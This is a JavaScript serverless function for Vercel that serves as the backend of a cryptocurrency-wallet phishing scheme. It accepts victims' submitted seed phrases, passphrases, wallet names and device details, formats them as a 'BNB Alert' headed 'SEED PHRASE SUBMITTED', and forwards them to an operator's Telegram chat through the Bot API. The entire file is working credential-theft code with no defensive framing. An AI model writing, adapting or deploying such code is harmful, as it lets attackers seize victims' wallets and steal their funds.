// Vercel Serverless Function for Telegram submissions
// Environment variables: TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID

module.exports = async (req, res) => {
  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  // Get credentials from environment variables
  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  // Validate environment variables
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('Missing Telegram credentials in environment variables');
    return res.status(500).json({ error: 'Server configuration error' });
  }

  try {
    // Parse request body (Vercel automatically parses JSON and form-urlencoded)
    let phrase, passphrase, imported, keywords, copyUrl, deviceInfo, formattedDate;
    
    // Handle both JSON and form-urlencoded/FormData requests
    if (typeof req.body === 'object' && req.body !== null) {
      phrase = req.body.phrase;
      passphrase = req.body.passphrase;
      imported = req.body.imported;
      keywords = req.body.keywords;
      copyUrl = req.body.copyUrl;
      deviceInfo = req.body.deviceInfo;
      formattedDate = req.body.formattedDate;
    }

    // Validate required fields
    if (!phrase || !imported) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    // Get device and browser information (passed from client)
    deviceInfo = deviceInfo || 'Unknown Device';
    formattedDate = formattedDate || new Date().toUTCString();
    const wordCountDesc = keywords ? `${keywords} word phrase` : '12 word phrase';

    // Format Telegram message in "BNB Alert" style
    const message = `🚨 *BNB Alert*\n\n` +
                   `🔑 *SEED PHRASE SUBMITTED*\n\n` +
                   `👤 *Wallet:* ${imported || 'Unknown'}\n` +
                   `🔤 *Words:* ${wordCountDesc}\n` +
                   `🕐 *Time:* ${formattedDate}\n` +
                   `🌍 *Location:* Unknown, Unknown\n` +
                   `📱 *Device:* ${deviceInfo.substring(0, 200)}${deviceInfo.length > 200 ? '...' : ''}\n\n` +
                   `🔒 *Seed Phrase:*\n` +
                   `\`${phrase}\`\n\n` +
                   `⚠️ _User attempted wallet recovery_\n\n` +
                   (copyUrl ? `[📎 Click to Copy Phrase](${copyUrl})` : '');

    // Send to Telegram via Bot API
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      })
    });

    const data = await response.json();

    if (data.ok) {
      return res.status(200).json({ success: true, message: 'Message sent to Telegram successfully' });
    } else {
      console.error('Telegram API error:', data);
      return res.status(500).json({ error: 'Failed to send message to Telegram', details: data.description });
    }
  } catch (error) {
    console.error('Error in Telegram API handler:', error);
    return res.status(500).json({ error: 'Internal server error' });
  }
};

